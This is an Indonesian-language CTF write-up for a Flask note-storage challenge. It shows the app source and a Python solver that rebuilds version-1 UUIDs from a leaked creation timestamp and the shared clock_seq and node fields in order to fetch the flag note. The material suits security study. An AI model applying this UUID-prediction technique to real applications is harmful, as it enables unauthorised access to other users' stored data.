# MCTF Cute n Wonder Writeup - Web
Pada challenge kali ini kita dihadapkan dengan aplikasi yang akan menyimpan suatu note dan kita bisa fetch note tersebut berdasarkan `UUID`, untuk mendapatkan flag pada challenge ini kita diharuskan untuk mengetahui `UUID` dari flag, dan ditampilkan pada landing page web timestamp ketika `flag` dibuat.

## Source Code
```python!
from flask import Flask, request, redirect, render_template
from random import randint
from uuid import uuid1
import psycopg2
import logging

# Konfigurasi logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

app = Flask(__name__, template_folder='templates')

first = 0
clock_seq = randint(0, 0xff)

def sqlwrap(func):
    def wrapper(*args, **kwargs):
        logging.info("Connecting to the database...")
        conn = psycopg2.connect(database="postgres",
                                host="db",
                                user="postgres",
                                password="postgres",
                                port="5432")
        cursor = conn.cursor()
        r = func(cursor, *args, **kwargs)
        conn.commit()
        conn.close()
        logging.info("Database connection closed.")
        return r
    return wrapper

@sqlwrap
def pull(cursor, id) -> tuple:
    logging.info(f"Executing SELECT for id: {id}")
    cursor.execute("SELECT * FROM results WHERE id = %s;", (id, ))
    row = cursor.fetchone()
    logging.info(f"Retrieved row: {row}")
    return row

@sqlwrap
def push(cursor, values: tuple) -> None:
    logging.info(f"Inserting values into database: {values}")
    cursor.execute("INSERT INTO results (id, prompt) VALUES (%s, %s);", values)

@app.route("/<id>")
def result(id):
    logging.info(f"Fetching result for id: {id}")
    result = pull(id)
    if result is None:
        logging.warning(f"Result not found for id: {id}")
        return "Result not found", 404
    id, prompt = result
    logging.info(f"Result found for id: {id}, prompt: {prompt}")
    return render_template("result.html", id=id, prompt=prompt, result=result)

@app.route("/")
def index():
    logging.info("Rendering index page.")
    return render_template("prompt.html", first=first)

@app.route("/prompt")
def prompt():
    prompt = request.args.get('prompt')
    logging.info(f"Received prompt: {prompt}")
    a = clock_seq
    id = uuid1(clock_seq=a)
    logging.info(f"clock_seq_used: {a}")
    logging.info(f"Generated UUID: {id}")

    global first
    if first == 0:
        first = id.time
        logging.info(f"Set first timestamp: {first}")

    push((str(id), prompt))
    logging.info(f"Redirecting to result page for id: {id}")
    return redirect(f"/{id}")
```

Terlihat pada kode diatas uuid di generate dengan `uuid version 1`, yang mana UUID ini di generate berdasarkan mac address, timestamp, dan clock_seq. clock_seq akan di generate sekali saat container dijalankan, dan yang membedakan antara uuid ini hanyalah timestamp saja.

berikut merupakan gambaran dari UUID1 dan bagaimana exploitasinya

```bash!
UUID_note1 : 87121c93-9aaa-11ef-80e1-0242ac120003 
UUID_note2 : ece173a1-9aaa-11ef-80e1-0242ac120003
UUID_note3 : f8203710-9aaa-11ef-80e1-0242ac120003
```

Berdasarkan kode diatas, UUID1 tidak sepenuhnya random dan ada beberapa section yang terus berulang, ini bisa kita manfaatkan untuk melakukan generate section 1 dari uuid dengan python dan menambahkan section lainnya dengan memanfaatkan UUId yang sudah ada.

Berikut kode python untuk generate UUID berdasarkan timestamp saja

## Solver Code
```python!
from uuid import UUID
from random import randint


def gen(timestamp):
	clock_seq = 0
	timestamp = timestamp  # waktu dalam 100-nanosecond sejak 15 Oktober 1582

	time_low = timestamp & 0xFFFFFFFF  # 32 bit terakhir
	time_mid = (timestamp >> 32) & 0xFFFF  # 16 bit berikutnya
	time_hi_version = ((timestamp >> 48) & 0x0FFF) | (1 << 12)  # 16 bit berikutnya dengan versi

	clock_seq_low = clock_seq & 0xFF
	clock_seq_hi_variant = (clock_seq >> 8) & 0x3F | 0x80  # Tambahkan bit varian

	node = 0x000000000000

	uuid_reconstructed = UUID(fields=(time_low, time_mid, time_hi_version, clock_seq_hi_variant, clock_seq_low, node))
	print(uuid_reconstructed)
# for i in range(9):
a = 139500170021133437 # Pastekan Timestamp dari pembuatan UUID flag
gen(a)
```

Lalu ambil section pertama dari source code lalu section selanjutnya ambil dari UUId dari challenge dan kita akan berhasil mendapatkan flag